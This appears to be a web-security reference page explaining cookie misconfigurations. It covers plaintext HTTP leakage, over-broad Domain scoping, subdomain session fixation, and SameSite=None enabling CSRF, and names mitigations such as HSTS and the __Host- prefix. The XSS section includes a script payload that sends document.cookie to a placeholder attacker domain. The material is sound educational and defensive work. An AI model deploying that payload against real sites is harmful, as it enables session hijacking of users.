# Cookie Misconfiguration

## Table of Contents

- [Session Hijacking](#session-hijacking)
- [Session Fixation](#session-fixation)
- [Chaining with XSS](#chaining-with-xss)
- [Chaining with CSRF](#chaining-with-csrf)

## Session Hijacking

### The session cookie is sent to places it was never meant to reach, where it can be read and reused.

- Sending the cookie over plaintext HTTP [^1]
    1. Cookie set by the service
        ```http
        Set-Cookie: session=[SESSION-ID]; HttpOnly
        ```

    2. Markup the attacker injects into any plaintext page the victim opens on a shared network
        ```html
        <img src="http://[VULNERABLE-SERVICE]/">
        ```
    Without `Secure`, the browser attaches the cookie to the plaintext request, where anyone on the network path can read it.

- Scoping the cookie to every subdomain
    ```http
    Set-Cookie: session=[SESSION-ID]; Domain=[VULNERABLE-SERVICE]; Secure; HttpOnly
    ```
    The cookie is sent to every subdomain, including ones operated by third parties and ones an attacker has taken over, as described in [Subdomain Takeover](./Subdomain_Takeover.md).

## Session Fixation

### A cookie for the whole domain can be set from any of its subdomains, so a subdomain that serves user content can fix the victim's session. [^2]

- Overwriting the session cookie from a subdomain
    ```http
    HTTP/1.1 200 OK
    Set-Cookie: session=attacker_value; Domain=[VULNERABLE-SERVICE]; Path=/account
    ```
    The response comes from a subdomain such as `user-content.[VULNERABLE-SERVICE]`. Because its `Path` is more specific, the browser sends this cookie before the legitimate one, and many frameworks use the first value. The resulting impacts are described in [Session Fixation](./Session_Fixation.md).

## Chaining with XSS

### Without `HttpOnly`, an XSS payload can copy the session cookie and keep using the session after the victim closes the page.

- Reading the session cookie from a script
    ```html
    <script>
        fetch(`https://[ATTACKER-DOMAIN]/?c=${document.cookie}`)
    </script>
    ```
    With `HttpOnly`, the same payload can still act within the page, as described in [XSS](./XSS.md), but cannot take the session elsewhere.

## Chaining with CSRF

### A cookie set with `SameSite=None` is attached to cross-site requests, so CSRF and Cross-Site WebSocket Hijacking remain possible.

- Opting out of the browser default
    ```http
    Set-Cookie: session=[SESSION-ID]; Secure; HttpOnly; SameSite=None
    ```
    Under the `SameSite=Lax` default, cross-site `POST` requests and framed pages are sent without the cookie. `SameSite=None` removes that protection, as described in [CSRF](./CSRF.md) and [Cross-Site WebSocket Hijacking](./Cross-Site_WebSocket_Hijacking.md).

[^1]: Applies when the service does not use HTTP Strict Transport Security (HSTS), which makes the browser upgrade the request to HTTPS before sending it.
[^2]: Applies when the cookie name does not use the `__Host-` prefix, which forbids the `Domain` attribute and therefore prevents subdomains from setting it.
